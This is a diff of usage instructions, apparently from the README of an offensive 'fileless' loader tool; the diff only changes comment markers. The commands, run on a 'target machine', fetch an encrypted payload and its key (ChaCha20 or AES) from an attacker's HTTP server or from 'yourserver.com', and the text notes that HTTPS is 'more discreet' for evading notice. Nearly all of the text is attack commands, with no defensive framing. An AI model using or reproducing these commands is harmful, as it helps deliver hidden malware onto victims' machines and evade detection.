@@ -76,22 +76,22 @@ python3 -m http.server 8080
 ```cmd
 FilelessAtfLoader.exe 192.168.1.100 8080 /cipher_chacha20.bin /key_chacha20.bin
 
-REM AES - On Windows (target machine)
+# AES - On Windows (target machine)
 FilelessAtfLoader.exe 192.168.1.100 8080 /cipher.bin /key.bin
 ```
 
 #### **Option B: URL mode**
 ```cmd
-REM ChaCha20 - HTTP URLs
+# ChaCha20 - HTTP URLs
 FilelessAtfLoader.exe http://192.168.1.100:8080/cipher_chacha20.bin http://192.168.1.100:8080/key_chacha20.bin
 
-REM AES - HTTP URLs
+# AES - HTTP URLs
 FilelessAtfLoader.exe http://192.168.1.100:8080/cipher.bin http://192.168.1.100:8080/key.bin
 
-REM ChaCha20 - HTTPS URLs (more discreet)
+# ChaCha20 - HTTPS URLs (more discreet)
 FilelessAtfLoader.exe https://yourserver.com/cipher_chacha20.bin https://yourserver.com/key_chacha20.bin
 
-REM AES - HTTPS URLs (more discreet)
+# AES - HTTPS URLs (more discreet)
 FilelessAtfLoader.exe https://yourserver.com/cipher.bin https://yourserver.com/key.bin
 ```
 
